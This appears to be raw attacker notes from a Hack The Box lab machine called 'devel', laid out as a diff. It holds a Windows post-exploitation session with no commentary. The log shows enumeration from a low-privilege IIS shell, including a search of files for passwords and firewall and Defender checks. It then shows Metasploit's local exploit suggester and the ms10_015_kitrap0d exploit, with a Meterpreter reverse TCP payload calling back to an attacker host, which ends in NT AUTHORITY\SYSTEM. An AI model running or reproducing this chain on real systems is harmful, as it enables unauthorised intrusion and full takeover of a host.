@@ -1,0 +1,732 @@
+cmds:
+1.shell
+2.systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+System Type:               X86-based PC
+
+c:\windows\system32\inetsrv>hostname
+hostname
+devel
+
+c:\windows\system32\inetsrv>wmic qfe
+wmic qfe
+No Instance(s) Available.
+
+
+
+c:\windows\system32\inetsrv>
+
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\web
+
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+\
+
+
+
+
+c:\windows\system32\inetsrv>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+
+
+c:\windows\system32\inetsrv>net users
+net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            babis                    Guest                    
+The command completed with one or more errors.
+
+
+c:\windows\system32\inetsrv>
+
+
+
+
+
+
+:\windows\system32\inetsrv>net users babis
+net users babis
+User name                    babis
+Full Name                    
+Comment                      
+User's comment               
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            18/3/2017 2:15:19 ��
+Password expires             Never
+Password changeable          18/3/2017 2:15:19 ��
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   18/3/2017 2:17:50 ��
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+c:\windows\system32\inetsrv>
+
+
+
+
+
+
+c:\windows\system32\inetsrv>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.10.5
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+
+Tunnel adapter isatap.{024DBC4C-1BA9-4DFC-8341-2C35AB1DF869}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 9:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+c:\windows\system32\inetsrv>
+
+
+
+
+
+c:\windows\system32\inetsrv>ipconfig /all
+ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : devel
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   Physical Address. . . . . . . . . : 00-50-56-B9-D4-EB
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.10.5(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+   DNS Servers . . . . . . . . . . . : 10.10.10.2
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap.{024DBC4C-1BA9-4DFC-8341-2C35AB1DF869}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+Tunnel adapter Local Area Connection* 9:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+c:\windows\system32\inetsrv>
+
+
+
+
+c:\windows\system32\inetsrv>arp -a
+arp -a
+
+Interface: 10.10.10.5 --- 0xb
+  Internet Address      Physical Address      Type
+  10.10.10.2            00-50-56-b9-17-92     dynamic   
+  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+
+c:\windows\system32\inetsrv>
+
+
+
+
+
+c:\windows\system32\inetsrv>route print
+route print
+===========================================================================
+Interface List
+ 11...00 50 56 b9 d4 eb ......Intel(R) PRO/1000 MT Network Connection
+  1...........................Software Loopback Interface 1
+ 12...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
+ 13...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0       10.10.10.2       10.10.10.5    266
+       10.10.10.0    255.255.255.0         On-link        10.10.10.5    266
+       10.10.10.5  255.255.255.255         On-link        10.10.10.5    266
+     10.10.10.255  255.255.255.255         On-link        10.10.10.5    266
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
+        224.0.0.0        240.0.0.0         On-link        10.10.10.5    266
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+  255.255.255.255  255.255.255.255         On-link        10.10.10.5    266
+===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0       10.10.10.2  Default 
+===========================================================================
+
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+  1    306 ::1/128                  On-link
+  1    306 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+
+c:\windows\system32\inetsrv>
+
+
+
+
+c:\windows\system32\inetsrv>netstat -ano
+netstat -ano
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1424
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       680
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       388
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       732
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       896
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       492
+  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       500
+  TCP    10.10.10.5:139         0.0.0.0:0              LISTENING       4
+  TCP    10.10.10.5:49159       10.10.14.8:4444        ESTABLISHED     3496
+  TCP    [::]:21                [::]:0                 LISTENING       1424
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       680
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:5357              [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       388
+  TCP    [::]:49153             [::]:0                 LISTENING       732
+  TCP    [::]:49154             [::]:0                 LISTENING       896
+  TCP    [::]:49155             [::]:0                 LISTENING       492
+  TCP    [::]:49156             [::]:0                 LISTENING       500
+  UDP    0.0.0.0:123            *:*                                    1000
+  UDP    0.0.0.0:3702           *:*                                    1364
+  UDP    0.0.0.0:3702           *:*                                    1364
+  UDP    0.0.0.0:5355           *:*                                    1076
+  UDP    0.0.0.0:53395          *:*                                    1364
+  UDP    10.10.10.5:137         *:*                                    4
+  UDP    10.10.10.5:138         *:*                                    4
+  UDP    [::]:123               *:*                                    1000
+  UDP    [::]:3702              *:*                                    1364
+  UDP    [::]:3702              *:*                                    1364
+  UDP    [::]:53396             *:*                                    1364
+
+c:\windows\system32\inetsrv>
+
+
+
+
+c:\Windows\System32>findstr /si password *.txt
+findstr /si password *.txt
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password.";
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          >> Msg1="Please enter your password.";
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                    Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:        Msg1                           "Please enter your password."
+WindowsPowerShell\v1.0\en-US\about_remote_FAQ.help.txt:    name and password credentials on the local computer or the credentials
+WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:    2. Verify that a password is set on the workgroup-based computer. If a
+WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       password is not set or the password value is empty, you cannot run
+WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       To set password for your user account, use User Accounts in Control
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          function ScreenPassword($instance)
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          foreach ($a in @(get-wmiobject win32_desktop)) { ScreenPassword($a) }
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      This script checks each user account. The ScreenPassword function returns 
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      the name of any user account that does not have a password-protected 
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      screen saver. If the screen saver is password protected, the function 
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    The MakeCert.exe tool will prompt you for a private key password. The 
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    password ensures that no one can use or access the certificate without
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    your consent. Create and enter a password that you can remember. You will 
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    use this password later to retrieve the certificate.
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        6. Type a password, and then type it again to confirm.
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        4. On the Password page, select "Enable strong private key protection",
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:           and then enter the password that you assigned during the export 
+FINDSTR: Cannot open restore\MachineGuid.txt
+
+c:\Windows\System32>
+
+
+
+c:\Windows\System32>findstr /si password *.txt *.ini *.config
+findstr /si password *.txt *.ini *.config
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password.";
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          >> Msg1="Please enter your password.";
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                    Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
+WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:        Msg1                           "Please enter your password."
+WindowsPowerShell\v1.0\en-US\about_remote_FAQ.help.txt:    name and password credentials on the local computer or the credentials
+WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:    2. Verify that a password is set on the workgroup-based computer. If a
+WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       password is not set or the password value is empty, you cannot run
+WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       To set password for your user account, use User Accounts in Control
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          function ScreenPassword($instance)
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          foreach ($a in @(get-wmiobject win32_desktop)) { ScreenPassword($a) }
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      This script checks each user account. The ScreenPassword function returns 
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      the name of any user account that does not have a password-protected 
+WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      screen saver. If the screen saver is password protected, the function 
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    The MakeCert.exe tool will prompt you for a private key password. The 
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    password ensures that no one can use or access the certificate without
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    your consent. Create and enter a password that you can remember. You will 
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    use this password later to retrieve the certificate.
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        6. Type a password, and then type it again to confirm.
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        4. On the Password page, select "Enable strong private key protection",
+WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:           and then enter the password that you assigned during the export 
+FINDSTR: Cannot open restore\MachineGuid.txt
+
+c:\Windows\System32>
+
+
+
+
+c:\Windows\System32>sc query windefend
+sc query windefend
+
+SERVICE_NAME: windefend 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+c:\Windows\System32>
+
+
+
+
+c:\Windows\System32>sc queryex type= service
+sc queryex type= service
+
+SERVICE_NAME: AppHostSvc
+DISPLAY_NAME: Application Host Helper Service
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 1308
+        FLAGS              : 
+
+SERVICE_NAME: AudioEndpointBuilder
+DISPLAY_NAME: Windows Audio Endpoint Builder
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 852
+        FLAGS              : 
+
+
+
+
+
+
+
+
+
+
+c:\Windows\System32>netsh firewall show state
+netsh firewall show state
+
+Firewall status:
+-------------------------------------------------------------------
+Profile                           = Standard
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+Group policy version              = Windows Firewall
+Remote admin mode                 = Disable
+
+Ports currently open on all network interfaces:
+Port   Protocol  Version  Program
+-------------------------------------------------------------------
+No ports are currently open on all network interfaces.
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+
+c:\Windows\System32>
+netsh firewall show
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+c:\Windows\System32>netsh firewall show config
+netsh firewall show config
+
+Domain profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+
+Allowed programs configuration for Domain profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Domain profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Domain profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+
+Standard profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+
+Service configuration for Standard profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          Network Discovery
+
+Allowed programs configuration for Standard profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Standard profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Standard profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+
+Log configuration:
+-------------------------------------------------------------------
+File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+Max file size   = 4096 KB
+Dropped packets = Disable
+Connections     = Disable
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+
+c:\Windows\System32>
+
+
+
+
+
+meterpreter > run post/multi/recon/local_exploit_suggester 
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 29 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+
+
+
+
+c:\windows\system32\inetsrv>systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          5/5/2020, 9:48:06 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     1.023 MB
+Available Physical Memory: 702 MB
+Virtual Memory: Max Size:  2.047 MB
+Virtual Memory: Available: 1.499 MB
+Virtual Memory: In Use:    548 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+
+c:\windows\system32\inetsrv>
+
+
+
+
+
+
+
+
+
+meterpreter > background 
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
+msf5 exploit(windows/local/ms10_015_kitrap0d) > options 
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 2K SP4 - Windows 7 (x86)
+
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
+SESSION => 1
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
+lhost => tun0
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set lport 5555
+lport => 5555
+msf5 exploit(windows/local/ms10_015_kitrap0d) > options 
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 2K SP4 - Windows 7 (x86)
+
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 192.168.88.128:5555 
+[*] Launching notepad to host the exploit...
+[+] Process 3680 launched.
+[*] Reflectively injecting the exploit DLL into 3680...
+[*] Injecting exploit into 3680 ...
+[*] Exploit injected. Injecting payload into 3680...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/ms10_015_kitrap0d) > options 
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.88.128   yes       The listen address (an interface may be specified)
+   LPORT     5555             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 2K SP4 - Windows 7 (x86)
+
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
+lhost => tun0
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.14.8:5555 
+[*] Launching notepad to host the exploit...
+[+] Process 3856 launched.
+[*] Reflectively injecting the exploit DLL into 3856...
+[*] Injecting exploit into 3856 ...
+[*] Exploit injected. Injecting payload into 3856...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (180291 bytes) to 10.10.10.5
+[*] Meterpreter session 2 opened (10.10.14.8:5555 -> 10.10.10.5:49159) at 2020-05-02 09:28:41 -0400
+
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell 
+Process 4076 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+nt authority\system
+
+c:\windows\system32\inetsrv>
